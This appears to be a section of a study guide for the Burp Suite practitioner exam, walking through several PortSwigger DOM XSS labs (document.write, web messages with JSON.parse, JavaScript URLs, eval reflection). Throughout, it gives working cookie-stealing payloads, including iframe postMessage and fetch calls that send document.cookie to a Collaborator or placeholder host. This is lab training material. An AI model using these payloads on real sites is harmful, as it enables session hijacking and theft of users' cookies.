<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/domxss-on-constructor.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/domxss-on-constructor.png" alt="domxss-on-constructor.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression" rel="nofollow">PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</a></p>
<p dir="auto"><a href="https://youtu.be/QpQp2JLn6JA" rel="nofollow">z3nsh3ll give an amazingly detail understanding on the constructor vulnerability in this lab on YouTube</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Doc Write Location search</h3><a id="user-content-doc-write-location-search" class="anchor" aria-label="Permalink: Doc Write Location search" href="#doc-write-location-search"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The target is vulnerable to DOM-XSS in the stock check function. <code>source code</code> reveal <code>document.write</code> is the sink used with <code>location.search</code> allowing us to add <strong>storeId</strong> query parameter with a value containing the JavaScript payload inside a <code>&lt;select&gt;</code> statement.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-xss-doc-write-inside-select.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-xss-doc-write-inside-select.png" alt="DOM-XSS doc write inside select" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Perform a test using below payload to <em><strong>identify</strong></em> the injection into the modified GET request, using <code>"&gt;</code> to escape.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="/product?productId=1&amp;storeId=fuzzer&quot;&gt;&lt;/select&gt;fuzzer"><pre>/product?productId=1&amp;storeId=fuzzer"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span>select<span class="pl-kos">&gt;</span>fuzzer</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/get-dom-xss.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/get-dom-xss.png" alt="get-dom-xss.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">DOM XSS <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md">cookie stealer payload</a> in a <code>document.write</code> sink using source <code>location.search</code> inside a <code>&lt;select&gt;</code> element. This can be send to victim via exploit server in <code>&lt;iframe&gt;</code>. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;&gt;&lt;/select&gt;&lt;script&gt;document.location='https://OASTIFY.COM/?domxss='+document.cookie&lt;/script&gt;//"><pre>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span>select<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-c1">=</span><span class="pl-s">'https://OASTIFY.COM/?domxss='</span><span class="pl-c1">+</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>//</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-xss.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-xss.png" alt="dom-xss" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element" rel="nofollow">PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">DOM XSS JSON.parse web messages</h3><a id="user-content-dom-xss-jsonparse-web-messages" class="anchor" aria-label="Permalink: DOM XSS JSON.parse web messages" href="#dom-xss-jsonparse-web-messages"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target use web messaging and parses the message as JSON.<br>
Exploiting the vulnerability by constructing an HTML page on the exploit server,<br>
that exploits DOM XSS vulnerability.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies</h4><a id="user-content-requirements-to-steal-cookie-using-this-method-same-origin-execution-and-non-httponly-cookies" class="anchor" aria-label="Permalink: Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies" href="#requirements-to-steal-cookie-using-this-method-same-origin-execution-and-non-httponly-cookies"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><strong>Rabbit hole:</strong> The CORS policy <code>No Access-Control-Allow-Origin</code>header block access for Collaborator from able to access to fetch and cookie need insecure flags, look out <em><strong>Neo</strong></em> the Matrix.</p>
</blockquote>
<blockquote>
<p dir="auto">The vulnerable JavaScript code on the target using event listener that listens for a web message.<br>
This event listener expects a <strong>string</strong> that is parsed using <strong>JSON.parse()</strong>.</p>
</blockquote>
<blockquote>
<p dir="auto">Identify the <code>JSON.parse()</code> in page code:</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/JSON_parse_web_messages.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/JSON_parse_web_messages.png" alt="JSON_parse_web_messages.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">In the JavaScript below, <em><strong>identify</strong></em> the event listener expects a <strong>type</strong> property<br>
and that the <strong>load-channel</strong> case of the <strong>switch</strong> statement changes the <strong>img src</strong> attribute.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> web messages on target that is using <code>postmessage()</code> with <strong>DOM Invader</strong>.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
	window.addEventListener('message', function(e) {
		var img = document.createElement('img'), ACMEplayer = {element: img}, d;
		document.body.appendChild(img);
		try {
			d = JSON.parse(e.data);
		} catch(e) {
			return;
		}
		switch(d.type) {
			case &quot;page-load&quot;:
				ACMEplayer.element.scrollIntoView();
				break;
			case &quot;load-channel&quot;:
				ACMEplayer.element.src = d.url;
				break;
			case &quot;player-height-changed&quot;:
				ACMEplayer.element.style.width = d.width + &quot;px&quot;;
				ACMEplayer.element.style.height = d.height + &quot;px&quot;;
				break;
			case &quot;redirect&quot;:
				window.location.replace(d.redirectUrl);
				break;
		}
	}, false);
&lt;/script&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span>
	window.addEventListener('message', function(e) <span class="pl-kos">{</span>
		<span class="pl-s1">var</span> <span class="pl-s1">img</span> <span class="pl-c1">=</span> <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">createElement</span><span class="pl-kos">(</span><span class="pl-s">'img'</span><span class="pl-kos">)</span><span class="pl-kos">,</span> <span class="pl-v">ACMEplayer</span> <span class="pl-c1">=</span> <span class="pl-kos">{</span><span class="pl-c1">element</span>: <span class="pl-s1">img</span><span class="pl-kos">}</span><span class="pl-kos">,</span> <span class="pl-s1">d</span><span class="pl-kos">;</span>
		<span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">body</span><span class="pl-kos">.</span><span class="pl-en">appendChild</span><span class="pl-kos">(</span><span class="pl-s1">img</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
		<span class="pl-k">try</span> <span class="pl-kos">{</span>
			d <span class="pl-c1">=</span> <span class="pl-c1">JSON</span><span class="pl-kos">.</span><span class="pl-en">parse</span><span class="pl-kos">(</span><span class="pl-s1">e</span><span class="pl-kos">.</span><span class="pl-c1">data</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
		<span class="pl-kos">}</span> <span class="pl-en">catch</span><span class="pl-kos">(</span><span class="pl-s1">e</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
			return<span class="pl-kos">;</span>
		<span class="pl-kos">}</span>
		<span class="pl-en">switch</span><span class="pl-kos">(</span><span class="pl-s1">d</span><span class="pl-kos">.</span><span class="pl-c1">type</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
			<span class="pl-s1">case</span> <span class="pl-s">"page-load"</span>:
				<span class="pl-v">ACMEplayer</span><span class="pl-kos">.</span><span class="pl-c1">element</span><span class="pl-kos">.</span><span class="pl-en">scrollIntoView</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
				<span class="pl-k">break</span><span class="pl-kos">;</span>
			<span class="pl-k">case</span> <span class="pl-s">"load-channel"</span>:
				<span class="pl-v">ACMEplayer</span><span class="pl-kos">.</span><span class="pl-c1">element</span><span class="pl-kos">.</span><span class="pl-c1">src</span> <span class="pl-c1">=</span> <span class="pl-s1">d</span><span class="pl-kos">.</span><span class="pl-c1">url</span><span class="pl-kos">;</span>
				<span class="pl-k">break</span><span class="pl-kos">;</span>
			<span class="pl-k">case</span> <span class="pl-s">"player-height-changed"</span>:
				<span class="pl-v">ACMEplayer</span><span class="pl-kos">.</span><span class="pl-c1">element</span><span class="pl-kos">.</span><span class="pl-c1">style</span><span class="pl-kos">.</span><span class="pl-c1">width</span> <span class="pl-c1">=</span> <span class="pl-s1">d</span><span class="pl-kos">.</span><span class="pl-c1">width</span> <span class="pl-c1">+</span> <span class="pl-s">"px"</span><span class="pl-kos">;</span>
				<span class="pl-v">ACMEplayer</span><span class="pl-kos">.</span><span class="pl-c1">element</span><span class="pl-kos">.</span><span class="pl-c1">style</span><span class="pl-kos">.</span><span class="pl-c1">height</span> <span class="pl-c1">=</span> <span class="pl-s1">d</span><span class="pl-kos">.</span><span class="pl-c1">height</span> <span class="pl-c1">+</span> <span class="pl-s">"px"</span><span class="pl-kos">;</span>
				<span class="pl-k">break</span><span class="pl-kos">;</span>
			<span class="pl-k">case</span> <span class="pl-s">"redirect"</span>:
				<span class="pl-smi">window</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-kos">.</span><span class="pl-en">replace</span><span class="pl-kos">(</span><span class="pl-s1">d</span><span class="pl-kos">.</span><span class="pl-c1">redirectUrl</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
				<span class="pl-k">break</span><span class="pl-kos">;</span>
		<span class="pl-kos">}</span>
	<span class="pl-kos">}</span>, false);
<span class="pl-kos">&lt;/</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto">To exploit the above <code>source code</code>,<br>
inject JavaScript into the <strong>JSON</strong> data to change "load-channel" field data<br>
and perform cookie stealer <code>document.cookie</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Host an <strong>iframe</strong> on the exploit server html body, and send it to the victim,<br>
resulting in the stealing of their cookie.<br>
<em><strong>IF</strong></em> the site CORS policy is poorly configured, then if the session cookie flags are insecurely set, the victim session cookie could be stolen and send to the Burp collaboration server.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://0a6800740474398f80cb03590060005e.web-security-academy.net/&quot;
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: &quot;load-channel&quot;,
            url: &quot;javascript:fetch(`https://tzwi4eohn1xy81l4n1bv40na016suii7.oastify.com/?c=`+encodeURIComponent(document.cookie))&quot;
          }), &quot;*&quot;)'&gt;
&lt;/iframe&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://0a6800740474398f80cb03590060005e.web-security-academy.net/</span>"
        <span class="pl-c1">onload</span>='<span class="pl-s">this.contentWindow.postMessage(</span>
<span class="pl-s">          JSON.stringify({</span>
<span class="pl-s">            type: "load-channel",</span>
<span class="pl-s">            url: "javascript:fetch(`https://tzwi4eohn1xy81l4n1bv40na016suii7.oastify.com/?c=`+encodeURIComponent(document.cookie))"</span>
<span class="pl-s">          }), "*")</span>'<span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">iframe</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/JSON_parse_web_messages_Exploit_server_Payload.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/JSON_parse_web_messages_Exploit_server_Payload.png" alt="JSON_parse_web_messages_Exploit_server_Payload.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">At the end of the iframe onload values is a "*", this is to indicate the target is any.</p>
</blockquote>
<blockquote>
<p dir="auto">Set an unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS<br>
<a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md">cookie stealer payloads</a>.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="document.cookie = &quot;TopSecret=UnsecureCookieValue4Peanut2025&quot;;"><pre><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span> <span class="pl-c1">=</span> <span class="pl-s">"TopSecret=UnsecureCookieValue4Peanut2025"</span><span class="pl-kos">;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png" alt="JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse" rel="nofollow">PortSwigger Lab: DOM XSS using web messages and JSON.parse</a></p>
<blockquote>
<p dir="auto">DOM Invader used to identify and Testing for DOM XSS using web messages</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-identify-web-messages.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-identify-web-messages.png" alt="DOM Invader identify web messages" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Replay the post message using DOM Invader after altering the JSON data.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{
    &quot;type&quot;: &quot;load-channel&quot;,
    &quot;url&quot;: &quot;JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie&quot;
}"><pre>{
    <span class="pl-ent">"type"</span>: <span class="pl-s"><span class="pl-pds">"</span>load-channel<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"url"</span>: <span class="pl-s"><span class="pl-pds">"</span>JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie<span class="pl-pds">"</span></span>
}</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-resend-web-messages.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-resend-web-messages.png" alt="DOM Invader resend web messages" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages" rel="nofollow">PortSwigger: Identify DOM XSS using PortSwigger DOM Invader</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">DOM XSS AddEventListener JavaScript URL</h3><a id="user-content-dom-xss-addeventlistener-javascript-url" class="anchor" aria-label="Permalink: DOM XSS AddEventListener JavaScript URL" href="#dom-xss-addeventlistener-javascript-url"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Reviewing the page <code>source code</code> we <em><strong>identify</strong></em> the <code>addeventlistener</code> call for a web message but there is an <code>if</code> condition checking if the string contains <code>http/s</code>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/source-code-web-message-url.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/source-code-web-message-url.png" alt="source-code-web-message-url.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The exploit server hosted payload below includes the <code>https</code> string, and is successful in bypassing the <code>if</code> condition check.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/&quot; onload=&quot;this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')&quot;&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/</span>" <span class="pl-c1">onload</span>="<span class="pl-s">this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')</span>"<span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/DOM-XSS-AddEventListener-JavaScript-URL.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/DOM-XSS-AddEventListener-JavaScript-URL.png" alt="DOM-XSS AddEventListener JavaScript URL" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url" rel="nofollow">PortSwigger Lab: DOM XSS using web messages and a JavaScript URL</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">DOM XSS AddEventListener Ads Message</h3><a id="user-content-dom-xss-addeventlistener-ads-message" class="anchor" aria-label="Permalink: DOM XSS AddEventListener Ads Message" href="#dom-xss-addeventlistener-ads-message"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the <code>source code</code> we <em><strong>identify</strong></em> the call using <code>addEventListener</code> and an element id <code>ads</code> being referenced.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/source-code-web-message-ads.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/source-code-web-message-ads.png" alt="Source code web message ads" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The <code>fetch</code> function enclose the collaborator target inside <strong>back ticks</strong>, and when the iframe loads on the victim browser, the <code>postMessage()</code> method sends a web message to their home page.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/&quot; onload=&quot;this.contentWindow.postMessage('&lt;img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))&gt;','*')&quot;&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/</span>" <span class="pl-c1">onload</span>="<span class="pl-s">this.contentWindow.postMessage('&lt;img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))&gt;','*')</span>"<span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Replacing the Burp Lab payload <code>print()</code> with <code>fetch()</code> in the above code allow attacker to steal the victim session cookie.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/AddEventListener-Ads-Message.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/AddEventListener-Ads-Message.png" alt="AddEventListener Ads Message" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages" rel="nofollow">PortSwigger Lab: DOM XSS using web messages</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Reflected DOM XSS</h3><a id="user-content-reflected-dom-xss" class="anchor" aria-label="Permalink: Reflected DOM XSS" href="#reflected-dom-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the <strong>Search</strong> function a Reflected DOM-XSS vulnerability is <em><strong>identified</strong></em> using DOM Invader as being inside an <code>eval()</code> function.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-reflected-dom-xss-identify.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-reflected-dom-xss-identify.png" alt="DOM Invader reflected dom-xss identify" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> that the search JavaScript <code>source code</code> on the target, the string is reflected in a JSON response called search-results.
From the Site Map, open the <code>searchResults.js</code> file and notice that the JSON response is used with an <code>eval()</code> function call.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/reflected-dom-xss-source-code.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/reflected-dom-xss-source-code.png" alt="Reflected DOM-XSS source-code" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Testing <code>\"-alert(1)}//</code> payload we successfully escape the <code>eval()</code>. The attacker then craft an exploit phishing link to the victim with a <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md">cookie stealing payload</a> hosted on exploit server.<br>
Above payload validate that the backslash <strong>\</strong> is not sanitized, and the JSON data is then send to <code>eval()</code>.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a <strong>second</strong> backslash. The resulting double-backslash causes the escaping to be effectively <strong>cancelled out</strong>.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="\&quot;-fetch('https://OASTIFY.COM?reflects='+document.cookie)}//"><pre>\"<span class="pl-c1">-</span><span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">'https://OASTIFY.COM?reflects='</span><span class="pl-c1">+</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">)</span><span class="pl-kos">}</span><span class="pl-c1">/</span><span class="pl-c1">/</span></pre></div>
<blockquote>
<p dir="auto">In the above payload every character is URL encoded and used as the search parameter value. This target do not have an exploit server, so I hosted my own <code>python3 -m http.server 80</code> web service and save the <code>index.html</code> file that contain the <code>location</code> target URL between <code>&lt;script&gt;</code> tags.</p>
</blockquote>
